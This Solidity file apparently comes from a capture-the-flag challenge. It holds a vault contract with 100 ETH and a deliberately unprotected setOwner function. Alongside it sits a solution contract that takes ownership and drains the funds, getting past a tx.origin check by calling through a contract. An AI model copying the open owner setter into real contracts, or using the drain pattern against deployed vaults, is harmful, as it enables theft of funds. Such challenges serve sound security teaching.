//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.0;

//The VaultMEVSec contains 100ETH could you succeed to steal them?
contract VaultMevSec {
    address owner;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor() payable {
        require(
            msg.value == 100 ether,
            "100ETH required for the start the challenge"
        );
        owner = msg.sender;
    }

    function withdraw(address payable beneficiary) public onlyOwner {
        require(msg.sender != tx.origin);
        beneficiary.transfer(address(this).balance);
    }

    function setOwner() public {
        owner = msg.sender;
    }
}

contract MyContract {
    address payable public owner;
    VaultMevSec public vms;

    function win() public {
        vms.setOwner();
        vms.withdraw(owner);
    }

    function setOwner() public {
        owner = payable(msg.sender);
    }

    function setVms(VaultMevSec x) public {
        vms = x;
    }
}
